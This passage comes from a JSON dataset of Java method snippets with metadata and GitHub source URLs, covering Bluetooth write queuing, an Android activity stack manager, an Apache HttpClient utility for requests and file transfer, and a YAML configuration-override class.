(immediately) {\n                    writeQueue.add(0, writeData);\n                } else {\n                    writeQueue.add(writeData);\n                }\n                if (!writeRunning) {\n                    writeRunning = true;\n                    btManager.getExecutorService().execute(writeRunnable);\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/wandersnail/classic-bluetooth/master/library/src/main/java/cn/wandersnail/bluetooth/ConnectionImpl.java", "stars": "3", "class_props": {"extends": "Connection", "implements": null, "modifiers": []}}, {"id": 33617, "method_name": "getInstance", "class_name": "ActivityStackManager", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ActivityStackManager", "snippet": "    public static ActivityStackManager getInstance() {\n        // \u52a0\u5165\u53cc\u91cd\u6821\u9a8c\u9501\n        if(sInstance == null) {\n            synchronized (ActivityStackManager.class) {\n                if(sInstance == null){\n                    sInstance = new ActivityStackManager();\n                }\n            }\n        }\n        return sInstance;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/ActivityStackManager.java", "stars": "1", "class_props": {"extends": null, "implements": ["Application"], "modifiers": ["final", "public"]}}, {"id": 33618, "method_name": "init", "class_name": "ActivityStackManager", "params": ["Application"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init(Application application) {\n        mApplication = application;\n        application.registerActivityLifecycleCallbacks(this);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/ActivityStackManager.java", "stars": "1", "class_props": {"extends": null, "implements": ["Application"], "modifiers": ["final", "public"]}}, {"id": 33619, "method_name": "getApplication", "class_name": "ActivityStackManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Application", "snippet": "    public Application getApplication() {\n        return mApplication;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/ActivityStackManager.java", "stars": "1", "class_props": {"extends": null, "implements": ["Application"], "modifiers": ["final", "public"]}}, {"id": 33620, "method_name": "getTopActivity", "class_name": "ActivityStackManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Activity", "snippet": "    public Activity getTopActivity() {\n        return mActivitySet.get(mCurrentTag);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/ActivityStackManager.java", "stars": "1", "class_props": {"extends": null, "implements": ["Application"], "modifiers": ["final", "public"]}}, {"id": 33621, "method_name": "finishAllActivities", "class_name": "ActivityStackManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void finishAllActivities() {\n        finishAllActivities((Class<? extends Activity>) null);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/ActivityStackManager.java", "stars": "1", "class_props": {"extends": null, "implements": ["Application"], "modifiers": ["final", "public"]}}, {"id": 33622, "method_name": "finishAllActivities", "class_name": "ActivityStackManager", "params": ["Class<Activity>"], "throws": null, "modifiers": ["final", "public"], "return_type": "void", "snippet": "    public final void finishAllActivities(Class<? extends Activity>... classArray) {\n        String[] keys = mActivitySet.keySet().toArray(new String[]{});\n        for (String key : keys) {\n            Activity activity = mActivitySet.get(key);\n            if (activity != null && !activity.isFinishing()) {\n                boolean whiteClazz = false;\n                if (classArray != null) {\n                    for (Class<? extends Activity> clazz : classArray) {\n                        if (activity.getClass() == clazz) {\n                            whiteClazz = true;\n                        }\n                    }\n                }\n                // \u5982\u679c\u4e0d\u662f\u767d\u540d\u5355\u4e0a\u9762\u7684 Activity \u5c31\u9500\u6bc1\u6389\n                if (!whiteClazz) {\n                    activity.finish();\n                    mActivitySet.remove(key);\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/ActivityStackManager.java", "stars": "1", "class_props": {"extends": null, "implements": ["Application"], "modifiers": ["final", "public"]}}, {"id": 33623, "method_name": "getObjectTag", "class_name": "ActivityStackManager", "params": ["Object"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "    private static String getObjectTag(Object object) {\n        // \u5bf9\u8c61\u6240\u5728\u7684\u5305\u540d + \u5bf9\u8c61\u7684\u5185\u5b58\u5730\u5740\n        return object.getClass().getName() + Integer.toHexString(object.hashCode());\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/ActivityStackManager.java", "stars": "1", "class_props": {"extends": null, "implements": ["Application"], "modifiers": ["final", "public"]}}, {"id": 33624, "method_name": "onActivityCreated", "class_name": "ActivityStackManager", "params": ["Activity", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityCreated(@NonNull Activity activity, @Nullable Bundle savedInstanceState) {\n        mCurrentTag = getObjectTag(activity);\n        mActivitySet.put(getObjectTag(activity), activity);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/ActivityStackManager.java", "stars": "1", "class_props": {"extends": null, "implements": ["Application"], "modifiers": ["final", "public"]}}, {"id": 33625, "method_name": "onActivityStarted", "class_name": "ActivityStackManager", "params": ["Activity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityStarted(@NonNull Activity activity) {\n        mCurrentTag = getObjectTag(activity);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/ActivityStackManager.java", "stars": "1", "class_props": {"extends": null, "implements": ["Application"], "modifiers": ["final", "public"]}}, {"id": 33626, "method_name": "onActivityResumed", "class_name": "ActivityStackManager", "params": ["Activity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityResumed(@NonNull Activity activity) {\n        mCurrentTag = getObjectTag(activity);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/ActivityStackManager.java", "stars": "1", "class_props": {"extends": null, "implements": ["Application"], "modifiers": ["final", "public"]}}, {"id": 33627, "method_name": "onActivityPaused", "class_name": "ActivityStackManager", "params": ["Activity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityPaused(@NonNull Activity activity) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/ActivityStackManager.java", "stars": "1", "class_props": {"extends": null, "implements": ["Application"], "modifiers": ["final", "public"]}}, {"id": 33628, "method_name": "onActivityStopped", "class_name": "ActivityStackManager", "params": ["Activity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityStopped(@NonNull Activity activity) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/ActivityStackManager.java", "stars": "1", "class_props": {"extends": null, "implements": ["Application"], "modifiers": ["final", "public"]}}, {"id": 33629, "method_name": "onActivitySaveInstanceState", "class_name": "ActivityStackManager", "params": ["Activity", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivitySaveInstanceState(@NonNull Activity activity, @NonNull Bundle outState) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/ActivityStackManager.java", "stars": "1", "class_props": {"extends": null, "implements": ["Application"], "modifiers": ["final", "public"]}}, {"id": 33630, "method_name": "onActivityDestroyed", "class_name": "ActivityStackManager", "params": ["Activity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityDestroyed(@NonNull Activity activity) {\n        mActivitySet.remove(getObjectTag(activity));\n        if (getObjectTag(activity).equals(mCurrentTag)) {\n            // \u6e05\u9664\u5f53\u524d\u6807\u8bb0\n            mCurrentTag = null;\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/ActivityStackManager.java", "stars": "1", "class_props": {"extends": null, "implements": ["Application"], "modifiers": ["final", "public"]}}, {"id": 33631, "method_name": "init", "class_name": "HttpClientUtil", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void init() {\n        try {\n            int poolsize = Integer.parseInt(this.poolSize);\n            int socketTimeout = Integer.parseInt(this.socketTimeout);\n            int connectTimeout = Integer.parseInt(this.connectTimeout);\n            int connectionRequestTimeout = Integer.parseInt(this.connectionRequestTimeout);\n            int defaultMaxPerRoute = Integer.parseInt(this.defaultMaxPerRoute);\n\n            LOGGER.info(\"HttpClientUtil init. poolsize:{}, socketTimeout:{}, connectTimeout:{}, connectionRequestTimeout:{}, defaultMaxPerRoute:{}\",\n                    poolsize, socketTimeout, connectTimeout,\n                    connectionRequestTimeout, defaultMaxPerRoute);\n\n            //TrustManager[] trustAllCerts = { new MyTM() };\n\n            //SSLContext sc  = SSLContext.getInstance(\"SSL\");\n            //  sc.init(null, trustAllCerts, null);\n\n            Registry<ConnectionSocketFactory> socketFactoryRegistry = RegistryBuilder.<ConnectionSocketFactory>create()\n                    .register(\"http\", PlainConnectionSocketFactory.INSTANCE)\n                    //.register(\"https\", new SSLConnectionSocketFactory(sc))\n                    .build();\n\n           /* HostnameVerifier hv = (urlHostName, session) -> {\n                LOGGER.info(\"Warning: URL Host: \" + urlHostName + \" vs. \" + session.getPeerHost());\n                return true;\n            };*/\n\n            config = RequestConfig.custom()\n                    .setSocketTimeout(socketTimeout)\n                    .setConnectTimeout(connectTimeout)\n                    .setConnectionRequestTimeout(connectionRequestTimeout)\n                    .build();\n\n            PoolingHttpClientConnectionManager cm = new PoolingHttpClientConnectionManager(socketFactoryRegistry);\n            cm.setMaxTotal(poolsize);\n            cm.setDefaultMaxPerRoute(defaultMaxPerRoute);\n\n            client = HttpClients.custom()\n                    .setConnectionManager(cm)\n                    .setDefaultRequestConfig(config)\n                    //.setSSLHostnameVerifier(hv)\n                    .build();\n        } catch (Exception e) {\n            // log.error(\"\u521d\u59cb\u5316http client\u5f02\u5e38\", e);\n            log.error(\"An exception occurred while initializing http client\", e);\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/HttpClientUtil.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33632, "method_name": "doGet", "class_name": "HttpClientUtil", "params": ["String", "Map<String,Object>"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String doGet(String url, Map<String, Object> params) {\n        String apiUrl = url;\n        StringBuffer param = new StringBuffer();\n        CloseableHttpResponse response = null;\n        int i = 0;\n        for (String key : params.keySet()) {\n            if (i == 0) {\n                param.append(\"?\");\n            } else {\n                param.append(\"&\");\n            }\n\n            param.append(key).append(\"=\").append(params.get(key));\n            i++;\n        }\n        apiUrl += param;\n        String result = \"\";\n        HttpGet httpPost = new HttpGet(apiUrl);\n        try {\n            response = client.execute(httpPost);\n            int statusCode = response.getStatusLine().getStatusCode();\n            if (HTTP_SUCCESS != statusCode) {\n                return result;\n            }\n            HttpEntity entity = response.getEntity();\n            if (entity != null) {\n                result = EntityUtils.toString(entity);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            httpPost.abort();\n            try {\n                if (response != null) {\n                    response.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n                log.error(e.toString());\n            }\n        }\n        return result;\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/HttpClientUtil.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33633, "method_name": "postForm", "class_name": "HttpClientUtil", "params": ["String", "Map<String,Object>", "boolean"], "throws": ["ClientProtocolException", "IOException"], "modifiers": ["public"], "return_type": "String", "snippet": "    public String postForm(String url, Map<String, Object> map, boolean retry)\n            throws ClientProtocolException, IOException {\n        Assert.notNull(url, \"Error posting data, url is null.\");\n        return postInner(retry, parseHttpPost(url, getPostParams(map)));\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/HttpClientUtil.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33634, "method_name": "postJson", "class_name": "HttpClientUtil", "params": ["String", "String", "boolean"], "throws": ["ClientProtocolException", "IOException"], "modifiers": ["public"], "return_type": "String", "snippet": "    public String postJson(String url, String json, boolean retry)\n            throws ClientProtocolException, IOException {\n        Assert.notNull(url, \"Error posting data, url is null.\");\n        HttpPost parsedHttpPost = parseHttpPost(url, getPostParams(json));\n        parsedHttpPost.addHeader(\"Content-Type\", \"application/json\");\n        return postInner(retry, parsedHttpPost);\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/HttpClientUtil.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33635, "method_name": "post", "class_name": "HttpClientUtil", "params": ["String", "String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "CloseableHttpResponse", "snippet": "    public CloseableHttpResponse post(String url, String json) throws IOException {\n        HttpPost httpPost = new HttpPost(url);\n        if (json != null) {\n            httpPost.setEntity(getPostParams(json));\n        }\n\n        return client.execute(httpPost);\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/HttpClientUtil.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33636, "method_name": "get", "class_name": "HttpClientUtil", "params": ["String", "Map<String,Object>"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "CloseableHttpResponse", "snippet": "    public CloseableHttpResponse get(String url, Map<String, Object> params) throws IOException {\n        String apiUrl = url;\n        StringBuffer param = new StringBuffer();\n        CloseableHttpResponse response = null;\n        int i = 0;\n        for (String key : params.keySet()) {\n            if (i == 0) {\n                param.append(\"?\");\n            } else {\n                param.append(\"&\");\n            }\n\n            param.append(key).append(\"=\").append(params.get(key));\n            i++;\n        }\n        apiUrl += param;\n\n        HttpGet httpPost = new HttpGet(apiUrl);\n        return client.execute(httpPost);\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/HttpClientUtil.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33637, "method_name": "postInner", "class_name": "HttpClientUtil", "params": ["boolean", "HttpPost"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "String", "snippet": "    private String postInner(boolean retry, HttpPost httpPost) throws IOException {\n        // HttpResponse response = null;\n        CloseableHttpResponse response = null;\n        try {\n            // CloseableHttpClient httpClient = getHttpClient(retry);\n            response = client.execute(httpPost);\n            if (response.getStatusLine().getStatusCode() != HTTP_SUCCESS) {\n//\t\t\t\thttpPost.abort();\n                return null;\n            }\n            HttpEntity entity = response.getEntity();\n            String result = EntityUtils.toString(entity, Consts.UTF_8);\n            EntityUtils.consume(entity);\n            return result;\n        } finally {\n            httpPost.abort();\n            // httpPost.releaseConnection();\n            try {\n                if (response != null) {\n                    response.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n                log.error(e.toString());\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/HttpClientUtil.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33638, "method_name": "parseHttpPost", "class_name": "HttpClientUtil", "params": ["String", "HttpEntity"], "throws": null, "modifiers": ["private"], "return_type": "HttpPost", "snippet": "    private HttpPost parseHttpPost(String url, HttpEntity postParams) {\n        HttpPost httpPost = new HttpPost(url);\n        // httpPost.setConfig(getConfig());\n        httpPost.setEntity(postParams);\n        return httpPost;\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/HttpClientUtil.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33639, "method_name": "getPostParams", "class_name": "HttpClientUtil", "params": ["Map<String,Object>"], "throws": null, "modifiers": ["private"], "return_type": "HttpEntity", "snippet": "    private HttpEntity getPostParams(Map<String, Object> params) {\n        if (params == null || params.size() == 0) {\n            return null;\n        }\n        List<NameValuePair> nvps = new ArrayList<NameValuePair>();\n        Set<String> keySet = params.keySet();\n        for (String key : keySet) {\n            nvps.add(new BasicNameValuePair(key, params.get(key).toString()));\n        }\n        return new UrlEncodedFormEntity(nvps, Consts.UTF_8);\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/HttpClientUtil.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33640, "method_name": "getPostParams", "class_name": "HttpClientUtil", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "HttpEntity", "snippet": "    public HttpEntity getPostParams(String params) {\n        return new StringEntity(params, Consts.UTF_8);\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/HttpClientUtil.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33641, "method_name": "downloadFile", "class_name": "HttpClientUtil", "params": ["String", "String"], "throws": ["DownloadFileException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void downloadFile(String url, String localFilePath) throws DownloadFileException {\n        OutputStream out = null;\n        InputStream in = null;\n\n        try {\n            HttpGet httpGet = new HttpGet(url);\n            HttpResponse httpResponse = client.execute(httpGet);\n            HttpEntity entity = httpResponse.getEntity();\n\n            in = entity.getContent();\n\n            if (!entity.getContentType().getValue().equalsIgnoreCase(\"application/octet-stream\")) {\n                out = new ByteArrayOutputStream();\n                IOUtils.copy(in, out);\n\n                // throw new DownloadFileException(out.toString(), \"\u4e0b\u8f7d\u6587\u4ef6\u5931\u8d25\");\n                throw new DownloadFileException(out.toString(), \"File download failed\");\n            }\n\n            File file = new File(localFilePath);\n            out = new FileOutputStream(file, false);\n            IOUtils.copy(in, out);\n            out.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            IOUtils.closeQuietly(in);\n            IOUtils.closeQuietly(out);\n        }\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/HttpClientUtil.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33642, "method_name": "uploadFile", "class_name": "HttpClientUtil", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String uploadFile(String url, String filePath) {\n        try {\n            MultipartEntityBuilder multipartEntityBuilder = MultipartEntityBuilder.create();\n            File file = new File(filePath);\n\n            multipartEntityBuilder.addBinaryBody(\"file\", file);\n\n            HttpEntity httpEntity = multipartEntityBuilder.build();\n\n            HttpPost httpPost = new HttpPost(url);\n            httpPost.setEntity(httpEntity);\n\n            HttpResponse httpResponse = client.execute(httpPost);\n            HttpEntity responseEntity = httpResponse.getEntity();\n            int statusCode= httpResponse.getStatusLine().getStatusCode();\n            if (statusCode == 200) {\n                String result = EntityUtils.toString(responseEntity, Consts.UTF_8);\n                EntityUtils.consume(responseEntity);\n\n                return result;\n            }\n        } catch (IOException e) {\n            // log.error(String.format(\"\u4e0a\u4f20\u6587\u4ef6 %s \u5230 %s \u5f02\u5e38\", filePath, url));\n            log.error(String.format(\"An exception occurred while uploading files %s to %s\", filePath, url));\n            e.printStackTrace();\n        }\n\n        return \"\";\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/HttpClientUtil.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33643, "method_name": "sendFileAndJson", "class_name": "HttpClientUtil", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String sendFileAndJson(String url, String filePath, String jsonContent) {\n        try {\n            MultipartEntityBuilder multipartEntityBuilder = MultipartEntityBuilder.create();\n\n            if (!StringUtils.isEmpty(filePath)) {\n                File file = new File(filePath);\n                if (file.exists() && file.isFile()) {\n                    multipartEntityBuilder.addBinaryBody(\"file\", file);\n                }\n            }\n\n            if (!StringUtils.isEmpty(jsonContent)) {\n                multipartEntityBuilder.addTextBody(\"content\", jsonContent, ContentType.APPLICATION_JSON);\n            }\n\n            HttpEntity httpEntity = multipartEntityBuilder.build();\n\n            HttpPost httpPost = new HttpPost(url);\n            httpPost.setEntity(httpEntity);\n\n            HttpResponse httpResponse = client.execute(httpPost);\n            HttpEntity responseEntity = httpResponse.getEntity();\n            int statusCode= httpResponse.getStatusLine().getStatusCode();\n            if (statusCode == 200) {\n                String result = EntityUtils.toString(responseEntity, Consts.UTF_8);\n                EntityUtils.consume(responseEntity);\n\n                return result;\n            }\n        } catch (Exception e) {\n            // log.error(String.format(\"\u53d1\u9001\u6587\u4ef6 %s \u5230 %s \u5f02\u5e38\", filePath, url));\n            log.error(String.format(\"An exception occurred while sending files %s to %s\", filePath, url));\n            e.printStackTrace();\n        }\n\n        return \"\";\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/HttpClientUtil.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33644, "method_name": "retryRequest", "class_name": "RetryHandler", "params": ["IOException", "int", "HttpContext"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean retryRequest(IOException exception, int executionCount,\n                                    HttpContext context) {\n            System.out.println(executionCount);\n            if (executionCount >= RETRY_TIME) {\n                // Do not retry if over max retry count\n\n                return false;\n            }\n            if (exception instanceof InterruptedIOException) {\n                // Timeout\n                return false;\n            }\n            if (exception instanceof UnknownHostException) {\n                // Unknown host\n                return false;\n            }\n            if (exception instanceof ConnectTimeoutException) {\n                // Connection refused\n                return false;\n            }\n           /* if (exception instanceof SSLException) {\n                // SSL handshake exception\n                return false;\n            }*/\n\n            HttpClientContext clientContext = HttpClientContext.adapt(context);\n            HttpRequest request = clientContext.getRequest();\n\n            // \u589e\u52a0\u65e5\u5fd7\uff0c\u4fbf\u4e8e\u786e\u8ba4\u662f\u5426\u91cd\u8bd5\n\n\n            if (LOGGER.isDebugEnabled()) {\n                LOGGER.debug(\" retryCount = \" + executionCount);\n            }\n\n            boolean idempotent = !(request instanceof HttpEntityEnclosingRequest);\n            if (idempotent) {\n                // Retry if the request is considered idempotent\n                return true;\n            }\n            return false;\n        }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/util/HttpClientUtil.java", "stars": "7", "class_props": {"extends": null, "implements": ["HttpRequestRetryHandler"], "modifiers": []}}, {"id": 33645, "method_name": "merge", "class_name": "ConfigurationBase", "params": ["ConfigurationBase", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void merge(ConfigurationBase config, String path) {\n\n        if (config == null) return;\n        getOverrideConfig().merge(config.getOverrideSection(path));\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33646, "method_name": "merge", "class_name": "ConfigurationBase", "params": ["ConfigurationBase"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void merge(ConfigurationBase config) {\n\n        getOverrideConfig().merge(config);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33647, "method_name": "merge", "class_name": "ConfigurationBase", "params": ["ConfigurationSection"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void merge(ConfigurationSection config) {\n\n        getOverrideConfig().merge(config);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33648, "method_name": "getOverride", "class_name": "ConfigurationBase", "params": ["String", "V"], "throws": null, "modifiers": ["public"], "return_type": "V", "snippet": "    public <V> V getOverride(String key, V def) {\n\n        if (!isSet(key)) {\n            set(key, def);\n        }\n        if (def instanceof Integer) return (V) (Integer) getOverrideInt(key, (Integer) def);\n        if (def instanceof Double) return (V) (Double) getOverrideDouble(key, (Double) def);\n        return (V) getOverrideConfig().get(key, def);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33649, "method_name": "getOverrideInt", "class_name": "ConfigurationBase", "params": ["String", "int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getOverrideInt(String key, int def) {\n\n        return getOverrideConfig().getInt(key, def);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33650, "method_name": "getOverrideDouble", "class_name": "ConfigurationBase", "params": ["String", "double"], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double getOverrideDouble(String key, double def) {\n\n        return getOverrideConfig().getDouble(key, def);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33651, "method_name": "getOverrideString", "class_name": "ConfigurationBase", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getOverrideString(String key, String def) {\n\n        return getOverrideConfig().getString(key, def);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33652, "method_name": "getOverrideBool", "class_name": "ConfigurationBase", "params": ["String", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean getOverrideBool(String key, boolean def) {\n\n        return getOverrideConfig().getBoolean(key, def);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33653, "method_name": "getOverrideSection", "class_name": "ConfigurationBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "ConfigurationSection", "snippet": "    public ConfigurationSection getOverrideSection(String path) {\n\n        return getOverrideConfig().getSafeConfigSection(path);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33654, "method_name": "getOverrideConfig", "class_name": "ConfigurationBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "DataMap", "snippet": "    public DataMap getOverrideConfig() {\n\n        if (override == null) {\n            setOverrideConfig(createDataMap());\n        }\n        return this.override;\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33655, "method_name": "setOverrideConfig", "class_name": "ConfigurationBase", "params": ["DataMap"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOverrideConfig(DataMap override) {\n\n        this.override = override;\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33656, "method_name": "getSafeConfigSection", "class_name": "ConfigurationBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "ConfigurationSection", "snippet": "    public ConfigurationSection getSafeConfigSection(String path) {\n\n        ConfigurationSection configurationSection = getConfigurationSection(path);\n        if (configurationSection == null) {\n            configurationSection = createSection(path);\n        }\n        return configurationSection;\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, {"id": 33657, "method_name": "createDataMap", "class_name": "ConfigurationBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "DataMap", "snippet": "    public DataMap createDataMap() {\n\n        return new YamlDataMap(this, this);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/ConfigurationBase.java", "stars": "3", "class_props": {"extends": "YamlConfiguration", "implements": ["Config"], "modifiers": ["public", "abstract"]}}, 